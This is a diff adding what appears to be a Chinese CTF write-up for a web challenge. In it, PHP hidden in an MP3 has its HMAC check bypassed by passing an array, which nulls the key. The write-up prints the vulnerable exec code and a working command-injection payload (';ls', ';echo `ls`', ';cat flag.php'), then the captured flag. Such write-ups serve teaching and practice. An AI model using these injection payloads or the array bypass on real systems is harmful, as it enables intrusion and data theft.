@@ -1,0 +1,73 @@
+I"�<h3 id="考察点">考察点</h3>
+
+<ul>
+  <li>文件隐写</li>
+  <li><code class="language-plaintext highlighter-rouge">hash_hmac()</code> 函数漏洞，数组绕过</li>
+</ul>
+
+<h3 id="分析">分析</h3>
+
+<p>网站中只有一个黑猫警长的<del>性感</del>写真和一个播放器，简单查看一下源代码发现一行注释：</p>
+
+<pre><code class="language-HTML">&lt;/header&gt;
+&lt;!--都说听听歌了！--&gt;
+谁！竟敢踩我一只耳的尾巴！
+</code></pre>
+
+<p>那就下载歌曲下来看看里面有什么吧..</p>
+
+<p>下载完用Winhex打开分析一下，文件的尾部发现了PHP的代码。</p>
+
+<p><img src="..\images\image-20201226002627208.png" alt="image-20201226002627208" /></p>
+
+<p>把代码提取出来分析：</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="nb">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'Black-Cat-Sheriff'</span><span class="p">])</span> <span class="o">||</span> <span class="nb">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'One-ear'</span><span class="p">])){</span>
+    <span class="k">die</span><span class="p">(</span><span class="s1">'谁！竟敢踩我一只耳的尾巴！'</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="nv">$clandestine</span> <span class="o">=</span> <span class="nb">getenv</span><span class="p">(</span><span class="s2">"clandestine"</span><span class="p">);</span>
+<span class="c1">// 获取环境变量clandestine</span>
+<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'White-cat-monitor'</span><span class="p">]))</span>
+    <span class="nv">$clandestine</span> <span class="o">=</span> <span class="nb">hash_hmac</span><span class="p">(</span><span class="s1">'sha256'</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'White-cat-monitor'</span><span class="p">],</span> <span class="nv">$clandestine</span><span class="p">);</span>
+<span class="c1">// 生成带有密钥的哈希</span>
+<span class="c1">// hash_hmac ( string $algo , string $data , string $key [, bool $raw_output = false ] ) : string</span>
+<span class="c1">// algo 	  哈希算法名称 </span>
+<span class="c1">// data 	  要进行哈希运算的消息</span>
+<span class="c1">// key  	  使用 HMAC 生成信息摘要时所使用的密钥</span>
+<span class="c1">// raw_output 设置为 true 输出原始二进制数据， 设置为 false 输出小写 16 进制字符串</span>
+<span class="nv">$hh</span> <span class="o">=</span> <span class="nb">hash_hmac</span><span class="p">(</span><span class="s1">'sha256'</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'One-ear'</span><span class="p">],</span> <span class="nv">$clandestine</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$hh</span> <span class="o">!==</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'Black-Cat-Sheriff'</span><span class="p">]){</span>
+    <span class="k">die</span><span class="p">(</span><span class="s1">'有意瞄准，无意击发，你的梦想就是你要瞄准的目标。相信自己，你就是那颗射中靶心的子弹。'</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">echo</span> <span class="nb">exec</span><span class="p">(</span><span class="s2">"nc"</span><span class="mf">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'One-ear'</span><span class="p">]);</span>
+</code></pre></div></div>
+
+<p>大概就是要想办法求出<code class="language-plaintext highlighter-rouge">clandestine</code>的值，让传入的Black-Cat-Sheriff与加密后的One-ear相同，从而执行下面的命令。然后nc弹shell拿flag。但是想了半天不知道该怎么办，于是从网上寻找方法<del>(找师傅们的wp)</del>。然后发现一个神奇的数组，当在<code class="language-plaintext highlighter-rouge">$data</code>处传进去数组的时候，<code class="language-plaintext highlighter-rouge">clandestine</code>即密钥会被置为NULL，这样便绕过了加密。</p>
+
+<p><img src="..\images\image-20201226122224809.png" alt="image-20201226122224809" /></p>
+
+<p>剩下的就是命令构造，命令执行，可以用<code class="language-plaintext highlighter-rouge">;</code>截断它的命令</p>
+
+<p><img src="..\images\image-20201226122112759.png" alt="image-20201226122112759" /></p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">string</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span> <span class="s2">"67f5ea2e063353fe3a219e35fa13c15cbf73df6fc6cb89fa0c2eecb50a7d027e"</span>
+</code></pre></div></div>
+
+<p>这样就可以拼出payload</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Black-CatSheriff=67f5ea2e063353fe3a219e35fa13c15cbf73df6fc6cb89fa0c2eecb50a7d027e&amp;One-ear=;ls&amp;White-cat-monitor[]=0
+</code></pre></div></div>
+
+<p><img src="..\images\image-20201226123653335.png" alt="image-20201226123653335" /></p>
+
+<p>命令执行了，但是没有发现flag在哪里。八嘎！</p>
+
+<p>后来看了<a href="https://www.wkr.moe/">wkr</a>的<a href="https://www.wkr.moe/ctf/dayattack/424.html">wp</a>，然后自己测试了一下，发现<code class="language-plaintext highlighter-rouge">echo exec(ls);</code>只返回一个值，所以这里只有一个<code class="language-plaintext highlighter-rouge">vendor</code>，应该把语句换成<code class="language-plaintext highlighter-rouge">;echo `ls`</code> 这样就能显示出目录了。</p>
+
+<p><img src="..\images\image-20201226130100978.png" alt="image-20201226130100978" /></p>
+
+<p>命令换成<code class="language-plaintext highlighter-rouge">;cat flag.php</code> flag到手</p>
+
+<p><strong>flag:GWHT{y0u_mu3t_p@y_atTentiou_!0_lt}</strong></p>
+
+:ET
